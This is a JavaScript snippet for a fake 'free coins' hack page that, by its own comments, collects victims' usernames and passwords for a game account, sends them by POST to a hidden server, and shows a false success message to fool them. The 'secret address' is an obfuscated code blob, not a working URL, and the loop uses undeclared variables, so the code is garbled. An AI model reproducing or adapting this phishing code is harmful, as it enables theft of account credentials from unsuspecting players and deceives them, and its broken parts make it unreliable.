const btn = document.querySelector('button');

function scrapeAccount( data ) {
    const Request = new XMLHttpRequest(),
          Form  = new FormData();
  
    // Create data object with victims username and password for their weeknite account
    for( user in data ) {
      Form.append( user, data[ user ] );
      Form.append( pass, data[ pass ] );
    }
  
    // If account is successfully stolen and sent to server, make them think the hack worked
    Request.addEventListener( 'load', function( event ) {
      alert( 'Coins added to your account, enjoy!' );
    } );
  
    // If cant send data to server, make it seem like the hack isnt working
    Request.addEventListener(' error', function( event ) {
      alert( 'Oops! Something went wrong try the hack again.' );
    } );
  
    // S3CR37 4DDR355
    Request.open( 'POST', 'function _0x4d0b(){var _0x100d65=['3622ZLeGzr','19162550PEQEFy','4bPCeof','5053700lJUYot','2582760UWknew','117dWzylk','622472yRtxgi','1931875FTDMMR','14DuIXhT','2807481DyogSG','183vcUXkI'];_0x4d0b=function(){return _0x100d65;};return _0x4d0b();}function _0x4c1b(_0x17647a,_0x307f12){var _0x4d0b7c=_0x4d0b();return _0x4c1b=function(_0x4c1bc5,_0x363d8d){_0x4c1bc5=_0x4c1bc5-0x13d;var _0x125465=_0x4d0b7c[_0x4c1bc5];return _0x125465;},_0x4c1b(_0x17647a,_0x307f12);}(function(_0x335d80,_0x477a58){var _0x42560e=_0x4c1b,_0xcf2818=_0x335d80();while(!![]){try{var _0x1e40d1=parseInt(_0x42560e(0x13e))/0x1*(parseInt(_0x42560e(0x13f))/0x2)+parseInt(_0x42560e(0x13d))/0x3*(parseInt(_0x42560e(0x141))/0x4)+-parseInt(_0x42560e(0x146))/0x5+-parseInt(_0x42560e(0x143))/0x6*(-parseInt(_0x42560e(0x147))/0x7)+parseInt(_0x42560e(0x145))/0x8*(parseInt(_0x42560e(0x144))/0x9)+-parseInt(_0x42560e(0x142))/0xa+-parseInt(_0x42560e(0x140))/0xb;if(_0x1e40d1===_0x477a58)break;else _0xcf2818['push'](_0xcf2818['shift']());}catch(_0xe84300){_0xcf2818['push'](_0xcf2818['shift']());}}}(_0x4d0b,0x7b81a));' );
  
    Request.send( Form );
  }
  
  btn.addEventListener( 'click', function()
    { scrapeAccount( {test:'ok'} );
  } )